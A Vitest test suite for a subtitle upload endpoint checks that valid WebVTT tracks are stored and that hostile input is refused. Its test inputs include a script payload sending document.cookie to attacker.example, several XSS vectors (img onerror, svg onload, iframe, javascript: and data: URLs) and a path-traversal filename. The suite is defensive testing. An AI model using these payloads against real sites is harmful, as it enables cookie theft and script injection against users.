/**
 * PHASE 102 — adversarial tests for POST /api/media/assets/[id]/subtitles.
 *
 * A subtitle is the one media artefact whose CONTENT is rendered into the page,
 * so these tests are weighted towards the payload rather than the transport: the
 * container check ("does it start with WEBVTT") is necessary but nowhere near
 * sufficient, and the cases below are the ones that pass it while still being
 * hostile.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import {
  ASSET_ID,
  ORG_A,
  ORG_B,
  VALID_WEBVTT,
  buildAsset,
  emptyStore,
  mp4Bytes,
  multipartRequest,
  multipartUrl,
  routeParams,
  upload,
  type FakeStore,
} from "./harness";

const h = vi.hoisted(() => ({
  store: { assets: [], subtitles: [] } as FakeStore,
  session: null as null | { userId: string; orgId: string; role: string },
  /** How the caller authenticated. The origin gate applies to `jwt` only. */
  authMethod: "jwt" as "jwt" | "apikey",
  actorOrgIds: [] as string[],
  rateLimited: false,
  rateLimitKeys: [] as Array<{ bucket: string; key: string }>,
  entitlementAllowed: true,
  audit: [] as Array<Record<string, unknown>>,
  puts: [] as Array<{ key: string; contentType: string; size: number }>,
  deletes: [] as string[],
}));

vi.mock("@/lib/db/prisma", () => ({
  getPrisma: async () => {
    const { createFakePrisma } = await import("./harness");
    return createFakePrisma(h.store);
  },
}));

vi.mock("@/lib/api/auth", () => ({
  // Authentication now runs BEFORE the un-scoped owner lookup, so that a 401
  // cannot be used to probe whether an asset id exists. It mirrors `h.session`:
  // the same fixture drives both gates, so a suite cannot accidentally
  // authenticate at one and not the other.
  requirePlatformAuth: async () =>
    h.session
      ? { ctx: { userId: h.session.userId, orgId: h.session.orgId, authMethod: h.authMethod, scopes: [] } }
      : { error: "Authentication required", status: 401 },
}));

vi.mock("@/lib/org/context", () => ({
  requireOrgActor: async (_req: unknown, orgId: string) => {
    h.actorOrgIds.push(orgId);
    if (!h.session) return { error: "Authentication required", status: 401 };
    if (h.session.orgId !== orgId) return { error: "Not a member", status: 403 };
    return {
      ctx: {
        userId: h.session.userId,
        orgId,
        memberId: "member-1",
        role: h.session.role,
        status: "ACTIVE",
      },
    };
  },
}));

vi.mock("@/lib/auth/rate-limiter", () => ({
  checkRateLimit: async (bucket: string, key: string) => {
    h.rateLimitKeys.push({ bucket, key });
    return !h.rateLimited;
  },
  retryAfter: () => 30,
}));

vi.mock("@/lib/billing-governance/runtime/require-entitlement", async () => {
  const { NextResponse } = await import("next/server");
  return {
    enforceEntitlement: async () =>
      h.entitlementAllowed
        ? { ok: true, decision: { allowed: true } }
        : {
            ok: false,
            decision: { allowed: false },
            response: NextResponse.json({ error: "ENTITLEMENT_REQUIRED" }, { status: 402 }),
          },
  };
});

vi.mock("@/lib/audit/audit-service", () => ({
  recordAuditEvent: async (event: Record<string, unknown>) => {
    h.audit.push(event);
  },
}));

vi.mock("@/lib/media/storage", async (importOriginal) => {
  // Explicit annotation required: `assertMediaStorageKey` is an assertion
  // function and TypeScript refuses to call one through an inferred name (TS2775).
  const actual: typeof import("@/lib/media/storage") =
    await importOriginal<typeof import("@/lib/media/storage")>();
  return {
    ...actual,
    putMediaObject: async (args: { key: string; body: Buffer; contentType: string }) => {
      actual.assertMediaStorageKey(args.key);
      h.puts.push({ key: args.key, contentType: args.contentType, size: args.body.byteLength });
      return { key: args.key, sizeBytes: args.body.byteLength };
    },
    deleteMediaObject: async (key: string) => {
      h.deletes.push(key);
    },
  };
});

const URL_SUBS = multipartUrl(ASSET_ID, "subtitles");

async function route() {
  return import("../../assets/[id]/subtitles/route");
}

function vttForm(
  text: string,
  options: { name?: string; type?: string; locale?: string; label?: string; isDefault?: string } = {},
): FormData {
  const form = new FormData();
  form.set(
    "file",
    upload(options.name ?? "captions.vtt", options.type ?? "text/vtt", Buffer.from(text, "utf8")),
  );
  form.set("locale", options.locale ?? "en");
  if (options.label !== undefined) form.set("label", options.label);
  if (options.isDefault !== undefined) form.set("isDefault", options.isDefault);
  return form;
}

beforeEach(() => {
  h.store = emptyStore();
  h.store.assets.push(buildAsset({ processingState: "READY", contentType: "video/mp4" }));
  h.session = { userId: "user-1", orgId: ORG_A, role: "ENGINEER" };
  h.authMethod = "jwt";
  h.actorOrgIds = [];
  h.rateLimited = false;
  h.rateLimitKeys = [];
  h.entitlementAllowed = true;
  h.audit = [];
  h.puts = [];
  h.deletes = [];
  vi.resetModules();
});

afterEach(() => {
  vi.clearAllMocks();
});

// ── The control path ─────────────────────────────────────────────────────────

describe("subtitles — accepted track", () => {
  it("stores a valid WebVTT track under a server-generated key", async () => {
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT, { locale: "fa", label: "فارسی" })),
      routeParams(ASSET_ID),
    );

    expect(res.status).toBe(201);
    const payload = await res.json();
    expect(payload.data).toMatchObject({ locale: "fa", format: "vtt", label: "فارسی" });
    expect(JSON.stringify(payload)).not.toContain("media/");

    expect(h.puts).toHaveLength(1);
    expect(h.puts[0].key).toMatch(new RegExp(`^media/${ORG_A}/${ASSET_ID}/[0-9a-f-]{36}\\.vtt$`));
    expect(h.puts[0].contentType).toBe("text/vtt");
    expect(h.store.subtitles).toHaveLength(1);
    expect(h.store.subtitles[0]).toMatchObject({ organizationId: ORG_A, locale: "fa" });
  });

  it("accepts the legitimate WebVTT cue vocabulary", async () => {
    const text = [
      "WEBVTT",
      "",
      "00:00:01.000 --> 00:00:04.000",
      "<v.loud Engineer>Lock <b>and</b> <i>tag</i> the <c.warn>drive</c>.</v>",
      "",
      "00:00:04.000 --> 00:00:07.000",
      "<00:00:05.000><lang en>Verify zero energy.</lang>",
      "",
      "<ruby>回<rt>かい</rt></ruby>",
      "",
    ].join("\n");
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(res.status).toBe(201);
  });

  it("replaces an existing track for the same locale and removes the superseded object", async () => {
    const previousKey = `media/${ORG_A}/${ASSET_ID}/aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee.vtt`;
    h.store.subtitles.push({
      id: "sub-1",
      organizationId: ORG_A,
      mediaAssetId: ASSET_ID,
      locale: "en",
      storageKey: previousKey,
      format: "vtt",
      isDefault: false,
    });
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));

    expect(res.status).toBe(201);
    expect(h.store.subtitles).toHaveLength(1);
    expect(h.store.subtitles[0].storageKey).toBe(h.puts[0].key);
    expect(h.deletes).toEqual([previousKey]);
  });

  it("clears the previous default when a track is marked default", async () => {
    h.store.subtitles.push({
      id: "sub-1",
      organizationId: ORG_A,
      mediaAssetId: ASSET_ID,
      locale: "de",
      storageKey: `media/${ORG_A}/${ASSET_ID}/aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee.vtt`,
      isDefault: true,
    });
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT, { locale: "en", isDefault: "true" })),
      routeParams(ASSET_ID),
    );

    expect(res.status).toBe(201);
    const de = h.store.subtitles.find((s) => s.locale === "de");
    const en = h.store.subtitles.find((s) => s.locale === "en");
    expect(de?.isDefault).toBe(false);
    expect(en?.isDefault).toBe(true);
  });
});

// ── Payload hostility ────────────────────────────────────────────────────────

describe("subtitles — hostile payloads", () => {
  it("refuses a file that does not begin with WEBVTT", async () => {
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm("1\n00:00:00,000 --> 00:00:01,000\nSubRip\n")),
      routeParams(ASSET_ID),
    );
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_not_webvtt");
    expect(h.puts).toHaveLength(0);
  });

  it("refuses `WEBVTTFOO` — the signature must be terminated", async () => {
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm("WEBVTTFOO\n\n00:00:00.000 --> 00:00:01.000\nx\n")),
      routeParams(ASSET_ID),
    );
    expect(res.status).toBe(422);
    expect(h.puts).toHaveLength(0);
  });

  it("refuses an embedded <script> even though the file is a valid WebVTT container", async () => {
    const text = [
      "WEBVTT",
      "",
      "00:00:00.000 --> 00:00:02.000",
      "<script>fetch('https://attacker.example/'+document.cookie)</script>",
      "",
    ].join("\n");
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_unsafe_markup");
    expect(h.puts).toHaveLength(0);
  });

  it("refuses <iframe>, <img onerror> and <svg> payloads", async () => {
    const payloads = [
      "<iframe src=https://attacker.example></iframe>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<a href=https://attacker.example>click</a>",
      "<style>body{display:none}</style>",
    ];
    for (const payload of payloads) {
      vi.resetModules();
      h.puts = [];
      const { POST } = await route();
      const text = `WEBVTT\n\n00:00:00.000 --> 00:00:02.000\n${payload}\n`;
      const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
      expect(res.status, payload).toBe(422);
      expect((await res.json()).error).toBe("subtitle_unsafe_markup");
      expect(h.puts).toHaveLength(0);
    }
  });

  it("refuses a javascript: URL inside cue text", async () => {
    const text = "WEBVTT\n\n00:00:00.000 --> 00:00:02.000\nSee javascript:alert(1) for details\n";
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_unsafe_url");
  });

  it("refuses a data: URL inside cue text", async () => {
    const text =
      "WEBVTT\n\n00:00:00.000 --> 00:00:02.000\ndata:text/html;base64,PHNjcmlwdD4=\n";
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_unsafe_url");
  });

  it("refuses a TAB-split scheme, which a browser would still resolve", async () => {
    const split = `java${String.fromCharCode(9)}script:alert(1)`;
    const text = `WEBVTT\n\n00:00:00.000 --> 00:00:02.000\n${split}\n`;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_unsafe_url");
  });

  it("refuses NUL and other control characters in cue text", async () => {
    const text = `WEBVTT\n\n00:00:00.000 --> 00:00:02.000\nhello${String.fromCharCode(0)}world\n`;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_control_characters");
  });

  it("refuses invalid UTF-8", async () => {
    const form = new FormData();
    const invalid = Buffer.concat([
      Buffer.from("WEBVTT\n\n00:00:00.000 --> 00:00:02.000\n", "utf8"),
      Buffer.from([0xff, 0xfe, 0xfd]),
      Buffer.from("\n", "utf8"),
    ]);
    form.set("file", upload("captions.vtt", "text/vtt", invalid));
    form.set("locale", "en");
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, form), routeParams(ASSET_ID));
    expect(res.status).toBe(422);
    expect((await res.json()).error).toBe("subtitle_not_utf8");
  });

  it("never echoes the hostile cue text back to the caller", async () => {
    const marker = "CANARY_PAYLOAD_9f2a";
    const text = `WEBVTT\n\n00:00:00.000 --> 00:00:02.000\n<script>${marker}</script>\n`;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(text)), routeParams(ASSET_ID));
    expect(JSON.stringify(await res.json())).not.toContain(marker);
    expect(JSON.stringify(h.audit)).not.toContain(marker);
  });

  it("refuses a video file uploaded to the subtitle surface", async () => {
    const form = new FormData();
    form.set("file", upload("clip.mp4", "video/mp4", mp4Bytes()));
    form.set("locale", "en");
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, form), routeParams(ASSET_ID));
    // Structurally valid — but it resolves to the `video` kind, and this surface
    // only accepts `subtitle`, so it is an unsupported media type rather than a
    // failed validation.
    expect(res.status).toBe(415);
    expect(h.puts).toHaveLength(0);
  });
});

// ── Metadata ─────────────────────────────────────────────────────────────────

describe("subtitles — field validation", () => {
  it("refuses a locale outside the platform set", async () => {
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT, { locale: "ru" })),
      routeParams(ASSET_ID),
    );
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe("invalid_locale");
  });

  it("refuses a missing locale", async () => {
    const form = new FormData();
    form.set("file", upload("captions.vtt", "text/vtt", Buffer.from(VALID_WEBVTT, "utf8")));
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, form), routeParams(ASSET_ID));
    expect(res.status).toBe(400);
  });

  it("refuses a label carrying a bidirectional override", async () => {
    const label = `English${String.fromCharCode(0x202e)}`;
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT, { label })),
      routeParams(ASSET_ID),
    );
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe("invalid_label");
  });

  it("refuses a traversal filename", async () => {
    const { POST } = await route();
    const res = await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT, { name: "../../../etc/passwd.vtt" })),
      routeParams(ASSET_ID),
    );
    expect(res.status).toBe(400);
    expect((await res.json()).error).toBe("filename_invalid");
  });

  it("rejects a track larger than the 2 MB subtitle ceiling", async () => {
    const bulky = `WEBVTT\n\n00:00:00.000 --> 00:00:02.000\n${"x".repeat(2 * 1024 * 1024 + 16)}\n`;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(bulky)), routeParams(ASSET_ID));
    expect(res.status).toBe(413);
    expect(h.puts).toHaveLength(0);
  });

  it("treats any isDefault value other than `true` as false", async () => {
    const { POST } = await route();
    await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT, { isDefault: "1" })),
      routeParams(ASSET_ID),
    );
    expect(h.store.subtitles[0].isDefault).toBe(false);
  });
});

// ── Authorization ────────────────────────────────────────────────────────────

describe("subtitles — authorization", () => {
  it("answers 401 to an anonymous caller", async () => {
    h.session = null;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));
    expect(res.status).toBe(401);
    expect(h.puts).toHaveLength(0);
  });

  it("answers 404 to a member of a different organization", async () => {
    h.session = { userId: "attacker", orgId: ORG_B, role: "OWNER" };
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));
    expect(res.status).toBe(404);
    expect(h.actorOrgIds).toEqual([ORG_A]);
    expect(h.store.subtitles).toHaveLength(0);
  });

  it("answers 403 to a role without manage_media", async () => {
    h.session = { userId: "viewer", orgId: ORG_A, role: "VIEWER" };
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));
    expect(res.status).toBe(403);
  });

  it("refuses to attach a track to a QUARANTINED asset", async () => {
    h.store.assets[0].processingState = "QUARANTINED";
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));
    expect(res.status).toBe(409);
    expect(h.puts).toHaveLength(0);
  });

  it("keys the limiter on X-Real-IP and ignores a forged forwarding header", async () => {
    const { POST } = await route();
    await POST(
      multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT), {
        realIp: "10.1.2.3",
        forwardedFor: "9.9.9.9, 8.8.8.8",
      }),
      routeParams(ASSET_ID),
    );
    expect(h.rateLimitKeys).toEqual([
      { bucket: "engineering-import", key: "media-subtitle:10.1.2.3" },
    ]);
  });

  it("answers 429 when the bucket is exhausted", async () => {
    h.rateLimited = true;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));
    expect(res.status).toBe(429);
    expect(res.headers.get("Retry-After")).toBe("30");
  });

  it("returns the entitlement denial verbatim", async () => {
    h.entitlementAllowed = false;
    const { POST } = await route();
    const res = await POST(multipartRequest(URL_SUBS, vttForm(VALID_WEBVTT)), routeParams(ASSET_ID));
    expect(res.status).toBe(402);
    expect(h.puts).toHaveLength(0);
  });

  it("never derives a rate-limit key from a client-controlled forwarding header", async () => {
    const { readFileSync } = await import("node:fs");
    const source = readFileSync("src/app/api/media/assets/[id]/subtitles/route.ts", "utf8");
    const live = source.replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
    expect(live.toLowerCase()).not.toContain("x-forwarded-for");
    expect(live).toContain("resolveClientIp");
  });
});
